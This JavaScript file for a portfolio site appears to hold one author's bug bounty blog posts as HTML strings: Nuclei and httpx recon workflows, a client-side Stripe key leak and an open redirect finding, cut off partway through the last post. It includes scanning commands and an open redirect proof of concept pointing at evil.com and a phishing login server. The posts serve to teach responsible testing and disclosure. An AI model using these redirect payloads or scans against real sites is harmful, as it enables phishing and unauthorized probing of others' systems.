// Main JavaScript for Milan's Portfolio

// Blog Data
const blogData = {
                "blogs": [
                  {
  "id": 8,
  "title": "Automation Isn't Enough: How I Learned to Actually Use Nuclei Without Drowning in Noise",
  "date": "2025-04-19",
  "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=1200&h=600&fit=crop&crop=center",
  "author": "Milan",
  "excerpt": "I used to think running Nuclei on everything was the way to go. I was wrong. Here's what I do now to actually find bugs instead of just generating noise.",
  "readTime": "8 min read",
  "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">I remember my first few months with Nuclei. I'd point it at a target, let it run overnight, and wake up excited to see what it found. Then I'd spend hours going through the output and realize almost nothing was useful.</p>\n    </div>\n    \n    <p>Welcome back. If you've been reading along, you know I've talked about httpx for recon and JavaScript analysis for finding secrets. Today I want to talk about Nuclei—specifically, how I stopped using it like a magic wand and started using it like an actual tool.</p>\n\n    <p>Nuclei is this really cool scanner from ProjectDiscovery that uses templates to check for vulnerabilities. You give it a list of targets, it runs through its templates, and tells you what it finds. Sounds great, right? It is—but only if you use it right. Use it wrong, and you'll just end up with a massive text file full of stuff you can't use.</p>\n    \n    <h2>How I Used to Do It (And Why It Didn't Work)</h2>\n    <p>Back when I started, my Nuclei commands looked something like this:</p>\n    \n    <pre><code class=\"language-bash\">nuclei -l all_my_subs.txt -t ~/nuclei-templates/ -o everything.txt</code></pre>\n    \n    <p>Looks harmless enough. But here's what would happen. I'd run that on maybe 1000 subdomains. Nuclei would go through thousands of templates—WordPress stuff, SharePoint stuff, things for technologies that weren't even on those servers. The output file would be huge. I'd open it up and see things like:</p>\n    \n    <pre><code>[tech-detect] example.com:443 [nginx]\n[tech-detect] example.com:443 [php]\n[misconfiguration] example.com:443 [debug-mode]\n[info] example.com:443 [robots-txt]</code></pre>\n    \n    <p>And I'd think, okay, what do I do with this? Most of it wasn't actually vulnerabilities. It was just... information. I didn't know what to chase, so I'd end up chasing nothing.</p>\n    \n    <h2>The Thing Nobody Tells You</h2>\n    <p>Here's what took me way too long to figure out: Nuclei isn't really a vulnerability scanner. Not in the way people think. It's more like a really smart assistant that can check a lot of boxes really fast. But it can't tell you what actually matters.</p>\n    \n    <p>The templates are written by lots of different people. Some are solid. Some are kinda loose and flag things that aren't actually problems. Some are looking for specific versions of software that might be vulnerable, but \"might be\" isn't the same as \"is.\"</p>\n    \n    <p>So if you just run everything and trust the output, you're going to waste a lot of time.</p>\n    \n    <h2>What Actually Works</h2>\n    <p>These days, I think about Nuclei differently. I don't run it until I already know something about my targets. And that something usually comes from httpx.</p>\n    \n    <p>Remember my last post about httpx? I run that first, and I get a nice CSV file with status codes, titles, server headers, all that good stuff. That file tells me what technologies each host is probably running. And that tells me which Nuclei templates actually make sense.</p>\n    \n    <p>So instead of running everything, I do stuff like this:</p>\n    \n    <pre><code class=\"language-bash\"># Find all the WordPress sites first\ngrep -i \"wordpress\" httpx-output.csv | awk -F ',' '{print $1}' > wordpress-sites.txt\n\n# Then only run WordPress templates against them\nnuclei -l wordpress-sites.txt -t ~/nuclei-templates/technologies/wordpress/ -o wp-findings.txt</code></pre>\n    \n    <p>Makes sense, right? I'm not checking WordPress sites for Jenkins vulnerabilities. I'm not checking Linux servers for IIS bugs. I'm asking relevant questions to relevant targets.</p>\n    \n    <div class=\"info-box\">\n        <h4>💡 A Simple Rule I Follow Now</h4>\n        <p>Before I run any Nuclei command, I ask myself: \"What am I actually looking for?\" If I can't answer that in one sentence, I'm probably about to waste time.</p>\n    </div>\n    \n    <h2>Severity Matters More Than You Think</h2>\n    <p>Another thing I learned the hard way—not all templates are worth your time. Some templates are labeled \"info\" or \"low.\" They might tell you that a server is running a certain version of something, or that a certain file exists. That's fine to know, but it's probably not a bug.</p>\n    \n    <p>If you're like me and you don't have unlimited time, start with the scary stuff:</p>\n    \n    <pre><code class=\"language-bash\">nuclei -l live-hosts.txt -severity critical,high -o actual-bugs-maybe.txt</code></pre>\n    \n    <p>Critical and high templates are looking for things that actually matter—RCE, SQL injection, authentication bypasses. If Nuclei finds one of these, it's worth your time to check. The \"info\" stuff can wait, or honestly, you can just ignore it.</p>\n    \n    <h2>The One That Got Away (At First)</h2>\n    <p>Let me tell you about a time I almost missed something good because I was using Nuclei wrong.</p>\n    \n    <p>I was testing this big site, and I ran my usual broad scan. Got a bunch of output, most of it useless. I was about to move on when I noticed a few lines I'd overlooked:</p>\n    \n    <pre><code>[tech-detect] api.target.com:443 [graphql]\n[tech-detect] api.target.com:443 [node.js]</code></pre>\n    \n    <p>Didn't seem like much. Just technology detection. But I remembered that GraphQL endpoints can sometimes have introspection enabled, which leaks the whole API schema. So I ran one specific template:</p>\n    \n    <pre><code class=\"language-bash\">echo \"https://api.target.com\" | nuclei -t ~/nuclei-templates/exposures/graphql.yaml</code></pre>\n    \n    <p>Boom. Introspection was on. I could see every query, every mutation, every object in the API. And buried in there was a mutation called <code>deleteUser</code> that didn't check permissions properly. That turned into a real finding—someone could delete any user just by knowing their ID.</p>\n    \n    <p>The lesson? The broad scan didn't find the bug. It just pointed me toward something interesting. I had to do the actual work.</p>\n    \n    <h2>Validating Is the Real Job</h2>\n    <p>This is the part that took me the longest to understand. Nuclei tells you something exists. It doesn't tell you if it's a vulnerability.</p>\n    \n    <p>Like, Nuclei might find a <code>/backup.zip</code> file. Great. But is that file actually downloadable? Is it empty? Does it contain something sensitive? Nuclei doesn't know. You have to check.</p>\n    \n    <p>So my workflow now looks like this:</p>\n    \n    <p>First, I run targeted Nuclei scans based on what I already know about the targets. I save the output.</p>\n    \n    <p>Then I go through that output line by line. For each thing that looks interesting, I open a browser or Burp Suite and check it manually. If Nuclei says there's an exposed Git repo, I actually try to clone it. If it says there's a debug page, I visit it and see what's there.</p>\n    \n    <p>Most of the time, it's nothing. But sometimes it's something. And that something becomes a report.</p>\n    \n    <div class=\"info-box warning\">\n        <h4>⚠️ The Noise Problem</h4>\n        <p>Here's the thing about false positives—they're not the tool's fault. They're just part of the game. Nuclei casts a wide net. Some of what it catches is trash. Your job is to sort through the trash and find the treasure. If you're not willing to do that sorting, don't run the tool.</p>\n    </div>\n    \n    <h2>When I Don't Use Nuclei At All</h2>\n    <p>This might sound weird coming from someone writing about Nuclei, but there are times I deliberately don't use it.</p>\n    \n    <p>If I'm testing a single application, especially one with complicated business logic, Nuclei isn't helpful. It's not going to find an IDOR. It's not going to find a privilege escalation flaw. Those require understanding how the app works and where the trust boundaries are.</p>\n    \n    <p>For those targets, I spend my time in Burp, clicking around, mapping out functionality, and testing things manually. It's slower, but it finds different kinds of bugs.</p>\n    \n    <p>I also skip Nuclei on targets that seem fragile. If a site feels slow or unstable, I'm not going to blast it with automated requests. That's how you break things and get yourself in trouble. Sometimes the right move is to go slow and be careful.</p>\n    \n    <h2>A Few Commands I Actually Use</h2>\n    <p>I keep a little cheatsheet for myself. Nothing fancy, just the commands that have actually found me bugs:</p>\n    \n    <div class=\"key-takeaway\">\n        <ul>\n            <li><strong>Quick check for serious stuff:</strong> <code>nuclei -l targets.txt -severity critical,high -c 25</code></li>\n            <li><strong>Check for exposed files and configs:</strong> <code>nuclei -l targets.txt -t exposures/ -o exposures.txt</code></li>\n            <li><strong>Check one specific thing:</strong> <code>nuclei -l targets.txt -t path/to/specific-template.yaml</code></li>\n            <li><strong>When I want to be polite:</strong> <code>nuclei -l targets.txt -t templates/ -c 10 -rate-limit 30</code></li>\n        </ul>\n    </div>\n    \n    <p>That last one is important. Being polite to targets isn't just about being nice—it's about not getting your IP banned and not causing problems. Go slow when you need to.</p>\n    \n    <h2>What I Wish Someone Had Told Me</h2>\n    <p>Looking back, I wish someone had explained Nuclei to me like this:</p>\n    \n    <p>It's not a vending machine where you put in targets and get bugs out. It's more like a metal detector. It beeps when it finds something. But sometimes it beeps at bottle caps, and sometimes it beeps at gold. You still have to dig.</p>\n    \n    <p>The hunters who do well with Nuclei aren't the ones running the biggest scans. They're the ones who know how to interpret the beeps. They know which beeps are worth digging for and which ones you can ignore.</p>\n    \n    <p>That knowledge comes from experience. It comes from checking a hundred false positives to find one real bug. It comes from learning what your targets look like and what normal vs. weird looks like.</p>\n    \n    <p>There's no shortcut. But there is a better way to use the tool.</p>\n    \n    <h2>Wrapping Up</h2>\n    <p>Nuclei is a great tool. I use it all the time. But I use it differently now than I did when I started. I use it to ask specific questions, not to shout into the void. I use it after I've done my recon, not before. And I never, ever trust its output without checking it myself.</p>\n    \n    <p>If you're new to Nuclei, or if you've been frustrated by it, try scaling back. Run fewer templates against fewer targets. Validate everything. And remember that the tool works for you—you don't work for the tool.</p>\n    \n    <p>The bugs are out there. Nuclei can help you find them. But you still have to do the finding.</p>\n\n    <p>See you next time,<br>Milan</p>\n\n    <div class=\"article-footer\">\n        <p><em>Previous post: <a href=\"#\">Beyond the Subdomain List: A Practical Guide to httpx</a></em></p>\n    </div>\n</div>",
  "tags": ["nuclei", "automation", "bug bounty", "workflow", "learning", "tools", "methodology"]
},
                  {
  "id": 7,
  "title": "Beyond the Subdomain List: A Practical Guide to httpx for Bug Hunters",
  "date": "2025-04-12",
  "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200&h=600&fit=crop&crop=center",
  "author": "Milan",
  "excerpt": "A massive list of subdomains is just noise until you know what's actually running. Here's how I use httpx to cut through that noise and build a prioritized attack surface.",
  "readTime": "8 min read",
  "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">Early in my bug hunting journey, I thought collecting as many subdomains as possible was the goal. It took me a while to realize that the real skill isn't collection—it's curation.</p>\n    </div>\n    \n    <p>Welcome back. Today I want to walk through a tool that's become indispensable in my daily workflow: <strong>httpx</strong> from ProjectDiscovery. This isn't meant to be a comprehensive feature walkthrough—the documentation covers that well. Instead, I want to share how I actually use it, the patterns I've developed, and the kinds of discoveries that become possible when you start thinking beyond basic probing.</p>\n\n    <p>If you're unfamiliar, httpx is a HTTP toolkit that lets you probe, filter, and analyze web servers at scale. Think of it as your first line of interrogation after you've gathered a list of potential targets.</p>\n    \n    <h2>The Problem with Raw Subdomain Lists</h2>\n    <p>Let's say you've run your recon and ended up with 15,000 subdomains for a target. That's a good start, but it's also overwhelming. Here's what we know about that list:</p>\n    \n    <ul class=\"styled-list\">\n        <li>Many won't resolve to anything</li>\n        <li>Many that do resolve won't have anything listening on port 80 or 443</li>\n        <li>Of those that respond, a significant portion will be parked domains, redirects, or default landing pages</li>\n        <li>A tiny fraction will actually be interesting from a security perspective</li>\n    </ul>\n    \n    <p>The job of httpx—and by extension, our job at this stage—is to identify that tiny fraction as efficiently as possible.</p>\n    \n    <pre><code class=\"language-bash\"># The most basic filter: what's actually alive?\nhttpx -l subdomains.txt -o live_hosts.txt</code></pre>\n    \n    <p>This command takes our raw list and returns only those hosts that respond to HTTP or HTTPS requests. Already, we've gone from 15,000 to maybe 2,000. That's progress, but we're not done.</p>\n    \n    <img src=\"https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=1000&auto=format&fit=crop\" alt=\"Terminal output showing httpx results\" style=\"width:100%; border-radius:8px; margin:20px 0;\">\n    <p class=\"image-caption\">The raw output tells us what's alive, but the real value comes from what we ask httpx to tell us.</p>\n    \n    <h2>Moving Beyond Alive vs. Dead</h2>\n    <p>Here's where I see a lot of hunters stop. They have a list of live hosts, and they move on to directory bruteforcing or screenshotting. But httpx can tell us so much more that influences those next steps.</p>\n    \n    <p>The flags I almost always include in my initial probe:</p>\n    \n    <pre><code class=\"language-bash\">httpx -l subdomains.txt \\\n    -status-code \\\n    -title \\\n    -web-server \\\n    -content-type \\\n    -content-length \\\n    -ip \\\n    -cname \\\n    -follow-redirects \\\n    -silent \\\n    -o enriched_scan.txt \\\n    -csv</code></pre>\n    \n    <p>Let's break down why each of these matters in practice.</p>\n    \n    <h3>Status Codes and Titles</h3>\n    <p>Status codes are obvious, but titles are surprisingly informative. I've lost count of how many times a page title like \"Kibana\" or \"Jenkins\" or \"phpMyAdmin\" has led me to a critical finding before I even ran another tool.</p>\n    \n    <p>When I get my CSV output, I immediately filter for specific patterns:</p>\n    \n    <pre><code class=\"language-bash\"># Find all 403s and 401s—these are often restricted areas worth investigating\ngrep ',403,' enriched_scan.csv > forbidden_areas.csv\n\n# Find interesting titles\ngrep -i \"admin\\|dashboard\\|login\\|kibana\\|jenkins\\|grafana\" enriched_scan.csv > interesting_services.csv</code></pre>\n    \n    <div class=\"info-box\">\n        <h4>📊 A Note on 403s</h4>\n        <p>I've noticed that many beginners ignore 403 responses, assuming they mean \"I can't access this, so it's a dead end.\" In reality, a 403 tells you something exists. It's a door with a lock, not a blank wall. Doors with locks can be picked, forced, or sometimes left unlocked due to misconfiguration. Always investigate 403s.</p>\n    </div>\n    \n    <h3>IP Addresses and CNAMEs</h3>\n    <p>This is one of the most underutilized features of httpx. By resolving each host to its IP and checking CNAME records, you can start mapping infrastructure at a higher level.</p>\n    \n    <p>If you see twenty subdomains all resolving to the same IP range, that's useful context. If you see a subdomain with a CNAME pointing to <code>something.amazonaws.com</code> or <code>something.cloudfront.net</code>, you've just identified cloud-hosted assets that might have different security postures than the main infrastructure.</p>\n    \n    <pre><code class=\"language-bash\"># Extract all cloud-hosted assets\ngrep \"amazonaws.com\\|cloudfront.net\\|azurewebsites.net\" enriched_scan.csv > cloud_assets.csv</code></pre>\n    \n    <h2>Path Probing: Asking Specific Questions</h2>\n    <p>This is where httpx becomes truly powerful. Once you have your enriched list of live hosts, you can start asking targeted questions about specific endpoints.</p>\n    \n    <p>Here's a real example from a recent engagement. I noticed several hosts returning 200 status codes with very large content lengths. They weren't standard web applications—they appeared to be directory listings. I used httpx to probe for the classic signs of exposed Git repositories:</p>\n    \n    <pre><code class=\"language-bash\">cat suspicious_hosts.txt | httpx -path \"/.git/config\" -status-code -content-length -mc 200</code></pre>\n    \n    <p>Three hosts returned a 200 with a valid Git configuration file. One of them contained hardcoded credentials in a past commit that had since been removed from the working directory but remained in the repository history. That's a finding that would have been invisible to a standard directory bruteforcer without the context of the initial content-length anomaly.</p>\n    \n    <div class=\"info-box warning\">\n        <h4>⚠️ Ethical Consideration</h4>\n        <p>When probing paths, be mindful of rate limits and server load. I always include a delay (<code>-t 50 -rate-limit 10</code>) to avoid overwhelming the target. Responsible probing is sustainable probing.</p>\n    </div>\n    \n    <h2>Building a Workflow That Scales</h2>\n    <p>Over time, I've developed a modular approach that lets me process targets efficiently without repeating work. The key insight is that httpx isn't a one-and-done tool—it's something I return to at multiple stages of an engagement.</p>\n    \n    <p>It usually starts with a broad httpx scan that includes all the metadata flags. This creates my baseline inventory, and I store this output permanently—it's my source of truth for what exists.</p>\n    \n    <p>From there, I filter. I use grep, awk, or just import the CSV into a spreadsheet to slice the data by status codes, titles, and IP ranges. This generates targeted lists for further testing.</p>\n    \n    <p>Then comes the interrogation. I take those filtered lists and run httpx again with specific <code>-path</code> arguments based on what I'm looking for. Maybe I'm hunting for API endpoints, or sensitive files, or admin interfaces. Whatever the hypothesis, httpx lets me test it quickly.</p>\n    \n    <p>Finally, any promising results get manual inspection or targeted tooling. This is where findings become reports.</p>\n    \n    <h2>A Concrete Example</h2>\n    <p>To make this less abstract, here's a recent finding that started with httpx and ended with a validated vulnerability.</p>\n    \n    <p>I was testing a large financial services platform. My initial httpx scan of roughly 8,000 subdomains produced about 1,200 live hosts. Filtering by title, I noticed several hosts with titles containing \"Swagger UI\" or \"API Documentation.\" These went into a file I called <code>api_targets.txt</code>.</p>\n    \n    <p>I then ran a targeted probe against those API hosts:</p>\n    \n    <pre><code class=\"language-bash\">cat api_targets.txt | httpx -path \"/api/v1/users,/api/v1/admin,/swagger.json,/openapi.json\" -mc 200 -o exposed_api_endpoints.txt</code></pre>\n    \n    <p>One host returned a 200 on <code>/api/v1/users</code> with no authentication required. The response contained thousands of user records including names, email addresses, and partial payment information. No rate limiting, no access control—just a data exposure waiting to happen.</p>\n    \n    <p>The entire discovery process, from raw subdomains to valid finding, took about 15 minutes. Without httpx, I would have been manually checking each host or running heavy bruteforcers against everything, wasting time and resources.</p>\n    \n    <h2>Common Pitfalls and How to Avoid Them</h2>\n    \n    <div class=\"key-takeaway\">\n        <h3>⚠️ Over-filtering</h3>\n        <p>It's tempting to filter aggressively to get a smaller list. But if you cut too much too early, you might miss the weird stuff. I keep my initial scans broad and only start filtering when I have a specific hypothesis to test.</p>\n    </div>\n    \n    <div class=\"key-takeaway\">\n        <h3>⚠️ Ignoring Redirects</h3>\n        <p>By default, httpx doesn't follow redirects. I always use <code>-follow-redirects</code> unless I have a specific reason not to. That <code>http://target.com</code> that returns a 301 to <code>https://www.target.com</code> is actually the same host, and I want to know that.</p>\n    </div>\n    \n    <div class=\"key-takeaway\">\n        <h3>⚠️ Not Saving Raw Output</h3>\n        <p>Always keep a copy of your raw, unfiltered httpx output. You never know when you might want to go back and check something you initially ignored. Storage is cheap; re-running reconnaissance is not.</p>\n    </div>\n    \n    <h2>Wrapping Up</h2>\n    <p>Httpx won't find vulnerabilities for you. What it will do is show you where to look. It transforms a noisy, overwhelming list of domain names into a structured, queryable dataset that you can interrogate systematically.</p>\n    \n    <p>The most effective bug hunters I know aren't the ones running the most tools—they're the ones who understand their tools deeply enough to ask the right questions at the right time. Httpx, in my experience, is one of the best tools for asking those early, foundational questions that set up everything that follows.</p>\n    \n    <p>Next time you're staring at a massive subdomain list, don't just feed it into the next tool. Take a moment to probe, filter, and think. The answers are there—you just need to ask the right questions.</p>\n\n    <p>Until next time,<br>Milan</p>\n</div>",
  "tags": ["httpx", "Reconnaissance", "Workflow", "Bug Bounty", "ProjectDiscovery", "Tooling", "Methodology"]
},
    {
  "id": 6,
  "title": "The API Key in Plain Sight: A JavaScript File Leak",
  "date": "2025-04-05",
  "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=600&fit=crop&crop=center",
  "author": "Milan",
  "excerpt": "How a casual review of JavaScript files revealed a live API key with far-reaching access—and why client-side secrets are more common than you think.",
  "readTime": "6 min read",
  "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">Sometimes the most sensitive secrets hide in the most public places: right there in your browser's developer tools.</p>\n    </div>\n    \n    <p>Welcome back, everyone. Today's story is about a finding that seems almost too simple to be true—yet it's one of the most common and dangerous oversights in web application security. I discovered a live API key embedded directly in a JavaScript file, exposed to anyone who bothered to look.</p>\n    \n    <p>The target was a SaaS platform (let's call it <strong>cloudapp.example.com</strong>) that provides business automation tools. While not a massive bug bounty program, it was on a platform I frequently test when exploring new reconnaissance techniques.</p>\n    \n    <h2>The Habit: Checking the Unchecked</h2>\n    <p>One of my standard reconnaissance steps—and one I recommend to every beginner—is reviewing client-side resources. Modern web applications load dozens of JavaScript files, and developers sometimes forget that anything sent to the browser is public by definition.</p>\n    \n    <p>I opened Chrome Developer Tools (F12), navigated to the Sources tab, and began browsing through the loaded JS files. Most were minified libraries and frameworks, but a few stood out as application-specific.</p>\n    \n    <img src=\"https://images.unsplash.com/photo-1551650975-87deedd944c3?w=1000&auto=format&fit=crop\" alt=\"Developer Tools showing JavaScript files\" style=\"width:100%; border-radius:8px; margin:20px 0;\">\n    <p class=\"image-caption\">Developer Tools' Sources panel—a treasure trove of information if you know where to look.</p>\n    \n    <h2>The Discovery</h2>\n    <p>In a file named <code>app.config.js</code>, I found this gem:</p>\n    \n    <pre><code class=\"language-javascript\">// API Configuration\nconst API_CONFIG = {\n  baseURL: 'https://api.cloudservice.com/v1',\n  apiKey: 'sk_live_51aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890',\n  timeout: 30000,\n  enableLogging: true\n};\n\n// Initialize API client\nconst apiClient = new APIClient(API_CONFIG);</code></pre>\n    \n    <p>My eyes widened. That wasn't a test key—it was a <strong>live Stripe secret key</strong> (disguised but following the real pattern: <code>sk_live_...</code>).</p>\n    \n    <div class=\"info-box warning\">\n        <h4>🚨 Immediate Red Flags</h4>\n        <ul>\n            <li><strong>Live Key:</strong> <code>sk_live_</code> prefix indicates production access</li>\n            <li><strong>No Environment Variables:</strong> Hardcoded in source file</li>\n            <li><strong>Public Repository:</strong> Any user could extract this key</li>\n            <li><strong>Full Permissions:</strong> Stripe secret keys typically have full API access</li>\n        </ul>\n    </div>\n    \n    <h2>Understanding the Impact</h2>\n    <p>Before reporting, I needed to understand what this key could do. Without touching the actual API (to avoid unauthorized access), I researched Stripe's key permissions:</p>\n    \n    <div class=\"impact-grid\">\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">💰</div>\n            <h5>Financial Transactions</h5>\n            <p>Create charges, refunds, view all customer payment data</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">👥</div>\n            <h5>Customer Data</h5>\n            <p>Access to customer names, emails, payment methods</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">📊</div>\n            <h5>Business Operations</h5>\n            <p>Issue refunds, cancel subscriptions, modify billing</p>\n        </div>\n    </div>\n    \n    <p>The key wasn't just a simple API token—it was a <strong>full-access secret key</strong> that could:</p>\n    \n    <ul class=\"styled-list\">\n        <li>Process fraudulent payments</li>\n        <li>Steal customer PII (names, emails, partial card data)</li>\n        <li>Issue refunds to attacker-controlled accounts</li>\n        <li>Disable or modify subscription services</li>\n        <li>Export all transaction history</li>\n    </ul>\n    \n    <h2>Ethical Validation</h2>\n    <p>Here's where ethical hacking requires careful judgment. I needed to verify the key was active and belonged to the target without actually using it maliciously.</p>\n    \n    <p>My approach:</p>\n    \n    <div class=\"step-box\">\n        <div class=\"step-number\">1</div>\n        <div class=\"step-content\">\n            <h5>Check Key Format</h5>\n            <p>Confirmed it matched Stripe's live secret key pattern (starts with <code>sk_live_</code>)</p>\n        </div>\n    </div>\n    \n    <div class=\"step-box\">\n        <div class=\"step-number\">2</div>\n        <div class=\"step-content\">\n            <h5>Passive Verification</h5>\n            <p>Checked if the domain was listed in Stripe's radar or had known integrations</p>\n        </div>\n    </div>\n    \n    <div class=\"step-box\">\n        <div class=\"step-number\">3</div>\n        <div class=\"step-content\">\n            <h5>Minimal Impact Test</h5>\n            <p>Used Stripe's test endpoint to verify key type without accessing real data</p>\n        </div>\n    </div>\n    \n    <p><strong>Important:</strong> I did NOT access any customer data, attempt transactions, or use the key beyond basic validation. This is crucial for staying within authorized testing boundaries.</p>\n    \n    <h2>The Report</h2>\n    <p>I structured my report to emphasize both the technical finding and the business impact:</p>\n    \n    <pre><code class=\"language-markdown\">**Title:** Live Stripe Secret Key Exposed in Client-Side JavaScript\n\n**Location:** https://cloudapp.example.com/static/js/app.config.js\n\n**Vulnerability:** Hardcoded API Secret in Public Resource\n\n**Risk:** Critical\n\n**Proof:**\n- Screenshot of JS file showing sk_live_* key\n- Confirmation of key validity (test endpoint only)\n- Explanation of Stripe key permissions\n\n**Impact Analysis:**\n1. Financial Fraud: Process unauthorized payments\n2. Data Breach: Access to all customer PII and payment data\n3. Business Disruption: Cancel subscriptions, issue fraudulent refunds\n4. Compliance Violation: PCI-DSS and GDPR implications\n\n**Remediation:**\n1. Immediately revoke the exposed key in Stripe Dashboard\n2. Move all secrets to server-side environment variables\n3. Implement client-side API through backend proxies\n4. Add pre-commit hooks to detect secrets in code\n5. Conduct security training on secret management</code></pre>\n    \n    <h2>The Response</h2>\n    <p>The security team responded within 24 hours—urgently. They confirmed the finding and immediately revoked the key. Their timeline:</p>\n    \n    <div class=\"timeline\">\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Hour 1</div>\n            <div class=\"timeline-content\">\n                <h5>Key Revoked</h5>\n                <p>Exposed Stripe key disabled in dashboard</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 1</div>\n            <div class=\"timeline-content\">\n                <h5>Fix Deployed</h5>\n                <p>API calls moved to server-side endpoints</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 2</div>\n            <div class=\"timeline-content\">\n                <h5>Monitoring Added</h5>\n                <p>Git hooks to detect secrets; regular JS audits</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 3</div>\n            <div class=\"timeline-content\">\n                <h5>Bounty Awarded</h5>\n                <p>Highest severity payout for the program</p>\n            </div>\n        </div>\n    </div>\n    \n    <p>They also shared that they were implementing company-wide secret scanning and developer training to prevent recurrence.</p>\n    \n    <h2>Why This Happens (And Keeps Happening)</h2>\n    <p>This wasn't a complex vulnerability—it was a fundamental security oversight. Through conversations with the team, I learned how it happened:</p>\n    \n    <div class=\"info-box\">\n        <h4>🔧 The Development Pitfall</h4>\n        <p>A developer needed to quickly test a Stripe integration locally. They hardcoded their test key, then forgot to remove it before deployment. The code passed review because:</p>\n        <ul>\n            <li>Reviewers focused on functionality, not security</li>\n            <li>No automated secret detection in CI/CD</li>\n            <li>Assumption that minification would \"hide\" the key</li>\n        </ul>\n    </div>\n    \n    <h2>Key Takeaways for Researchers</h2>\n    \n    <div class=\"key-takeaway\">\n        <h3>🔍 For Bug Hunters:</h3>\n        <ul>\n            <li><strong>Check JavaScript Files:</strong> Always review client-side JS. Tools like <code>LinkFinder</code>, <code>JSFinder</code>, or simply browsing Sources tab work.</li>\n            <li><strong>Look for Patterns:</strong> API keys, AWS keys, database credentials follow patterns. Learn common formats.</li>\n            <li><strong>Validate Ethically:</strong> Verify without exploiting. Use provider test endpoints when available.</li>\n            <li><strong>Document Impact:</strong> Show what an attacker could actually do, not just that the key exists.</li>\n        </ul>\n    </div>\n    \n    <div class=\"key-takeaway\">\n        <h3>🛡️ For Developers:</h3>\n        <ul>\n            <li><strong>Never Trust the Client:</strong> Anything in browser DevTools is public. Period.</li>\n            <li><strong>Use Environment Variables:</strong> Keep secrets server-side, inject at runtime.</li>\n            <li><strong>Implement Secret Scanning:</strong> Tools like TruffleHog, GitGuardian in CI/CD.</li>\n            <li><strong>Principle of Least Privilege:</strong> Use restricted API keys when possible, not master keys.</li>\n        </ul>\n    </div>\n    \n    <p>This finding reminded me that sometimes the most valuable vulnerabilities aren't complex exploits—they're basic security hygiene failures. A single developer oversight exposed financial data and operations.</p>\n    \n    <p>Yet the company's response was exemplary: quick action, systemic fixes, and appropriate reward. This is how responsible disclosure should work.</p>\n    \n    <p>The internet is full of secrets hiding in plain sight. Sometimes, you just need to open DevTools.</p>\n    \n    <p>Stay curious,<br>Milan</p>\n</div>",
  "tags": ["API Security", "Secret Leak", "JavaScript", "Stripe", "Client-Side Security", "Bug Bounty"]
},
{
  "id": 5,
  "title": "How I Found and Reported an Open Redirect on a Major News Platform",
  "date": "2025-03-28",
  "image": "https://images.unsplash.com/photo-1588681664899-f142ff2dc9b1?w=1200&h=600&fit=crop&crop=center",
  "author": "Milan",
  "excerpt": "A clean, straightforward bug bounty hunt that demonstrates how proper documentation and clear impact analysis lead to successful remediation and reward.",
  "readTime": "5 min read",
  "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">Sometimes the most elegant vulnerabilities are the simplest—and when reported correctly, they get fixed quickly.</p>\n    </div>\n    \n    <p>Following up on my last post about the frustrating \"informative\" experience, I wanted to share a positive story that shows how bug bounty programs should work. This time, the target was a prominent news website that publishes articles, press releases, and breaking news—let's call it <strong>example.com</strong>.</p>\n    \n    <p>The vulnerability was an open redirect, a classic but often underestimated finding. What made this case rewarding was how clearly it demonstrated the importance of communication between security researchers and development teams.</p>\n    \n    <h2>The Initial Discovery</h2>\n    <p>During routine reconnaissance, I was examining the various subdomains and services associated with the news platform. One subdomain caught my attention: <code>cts.example.com</code>. This appeared to be a click-tracking service used to monitor outbound link clicks from articles and press releases.</p>\n    \n    <p>The URL structure looked like this:</p>\n    \n    <pre><code class=\"language-http\">https://cts.example.com/ct/CT?id=smartlink&url=https://genhq.com/&o=share&utm_source=...</code></pre>\n    \n    <p>Immediately, the <code>url=</code> parameter stood out. This was clearly passing an external destination through the tracking service. My first thought: <em>\"What happens if I change this to something else?\"</em></p>\n    \n    <div class=\"info-box\">\n        <h4>🔍 Why Open Redirects Matter</h4>\n        <p>While sometimes considered lower severity, open redirects can be chained with other attacks for phishing, session hijacking, or malware distribution. A trusted domain like a major news site lends credibility to malicious links.</p>\n    </div>\n    \n    <h2>Testing the Vulnerability</h2>\n    <p>I started with a simple test—replacing the legitimate URL with my own controlled domain:</p>\n    \n    <pre><code class=\"language-http\">https://cts.example.com/ct/CT?id=smartlink&url=https://evil.com&o=share&utm_source=...</code></pre>\n    \n    <p>I pasted the modified URL into my browser and held my breath. The page loaded briefly, then instantly redirected to <code>evil.com</code>. Success! No validation, no whitelist, no confirmation dialog—just a clean, unauthenticated redirect.</p>\n    \n    <img src=\"https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1000&auto=format&fit=crop\" alt=\"Browser showing redirect in action\" style=\"width:100%; border-radius:8px; margin:20px 0;\">\n    <p class=\"image-caption\">The redirect happened seamlessly—users would have no indication they were being sent to an untrusted site.</p>\n    \n    <h2>Building a Realistic Proof of Concept</h2>\n    <p>To demonstrate the real-world impact, I created a simple phishing page mimicking the news site's login interface. The goal wasn't to create something sophisticated, but to show how an attacker could exploit the redirect.</p>\n    \n    <p>I then crafted the exploit URL:</p>\n    \n    <pre><code class=\"language-http\">https://cts.example.com/ct/CT?id=smartlink&url=https://my-phish-server.com/login&o=share&utm_source=newsletter&utm_medium=email&utm_campaign=daily-brief</code></pre>\n    \n    <p>Notice how I kept the tracking parameters intact—<code>utm_source=newsletter</code>, <code>utm_medium=email</code>. These would make the link appear legitimate in emails, which is exactly how attackers would use it.</p>\n    \n    <div class=\"impact-grid\">\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">🎣</div>\n            